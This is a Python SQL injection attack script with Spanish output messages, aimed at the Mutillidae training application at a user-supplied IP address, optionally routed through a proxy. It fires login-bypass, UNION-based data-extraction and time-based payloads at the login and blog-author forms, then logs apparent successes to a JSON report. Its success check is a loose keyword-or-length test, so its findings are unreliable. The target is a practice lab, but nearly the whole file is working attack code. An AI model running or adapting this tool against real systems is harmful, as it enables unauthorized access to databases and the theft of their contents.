#!/usr/bin/env python3
import requests
import time
import json
import re
from urllib.parse import urljoin
from datetime import datetime

class SQLInjectionTool:
    def __init__(self, target_ip, port=80, proxy_ip=None):
        self.target_ip = target_ip
        self.port = port
        self.base_url = f"http://{target_ip}:{port}/mutillidae/"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        })

        if proxy_ip:
            self.proxies = {
                'http': f'http://{proxy_ip}:8080',
                'https': f'http://{proxy_ip}:8080'
            }
        else:
            self.proxies = None

        self.payloads = [
            "' OR '1'='1",
            "' UNION SELECT user(),database(),version(),null,null--",
            "' AND SLEEP(5)--"
        ]

        self.vulnerable_pages = [
            {
                'page': 'index.php?page=login.php',
                'method': 'POST',
                'params': ['username', 'password', 'login-php-submit-button']
            },
            {
                'page': 'index.php?page=view-someones-blog.php',
                'method': 'POST',
                'params': ['author', 'view-someones-blog-php-submit-button']
            }
        ]

        self.successful_attacks = []

    def exploit(self):
        print(f"\n🚀 Escaneando {self.base_url} con proxy: {'Sí' if self.proxies else 'No'}\n")
        for page in self.vulnerable_pages:
            url = urljoin(self.base_url, page['page'])
            for payload in self.payloads:
                form_data = {}
                for param in page['params']:
                    if 'submit' in param.lower():
                        form_data[param] = 'Submit'
                    elif param in ['username', 'password', 'author']:
                        form_data[param] = payload
                    else:
                        form_data[param] = 'test'

                try:
                    if page['method'] == 'POST':
                        response = self.session.post(url, data=form_data, proxies=self.proxies, timeout=10)
                    else:
                        response = self.session.get(url, params=form_data, proxies=self.proxies, timeout=10)

                    if self.is_vulnerable(response.text):
                        print(f"🎯 ¡Inyección exitosa en {page['page']} con payload: {payload}")
                        self.successful_attacks.append({
                            'page': page['page'],
                            'payload': payload,
                            'response_length': len(response.text),
                            'timestamp': datetime.now().isoformat()
                        })
                except Exception as e:
                    print(f"[!] Error en {page['page']} con payload {payload}: {e}")
                time.sleep(1)

    def is_vulnerable(self, text):
        indicators = ['mysql', 'syntax', 'warning', 'error', 'root@', 'version']
        return any(ind in text.lower() for ind in indicators) or len(text) > 8000

    def report(self):
        if not self.successful_attacks:
            print("\n❌ No se detectaron inyecciones exitosas")
            return

        print(f"\n📊 Inyecciones exitosas: {len(self.successful_attacks)}")
        for i, attack in enumerate(self.successful_attacks, 1):
            print(f"{i}. Página: {attack['page']}\n   Payload: {attack['payload']}\n")

        with open("sql_injection_report.json", "w") as f:
            json.dump(self.successful_attacks, f, indent=2)
            print("💾 Reporte guardado en sql_injection_report.json")

def main():
    print("💉 MUTILLIDAE SQL INJECTION TOOL (con proxy opcional)")
    target_ip = input("🎯 IP del objetivo: ").strip()
    proxy_ip = input("🛡️  IP del proxy (ENTER si no usas): ").strip()
    port_input = input("🔌 Puerto (default 80): ").strip()
    port = int(port_input) if port_input else 80

    tool = SQLInjectionTool(target_ip, port, proxy_ip if proxy_ip else None)
    tool.exploit()
    tool.report()

if __name__ == "__main__":
    main()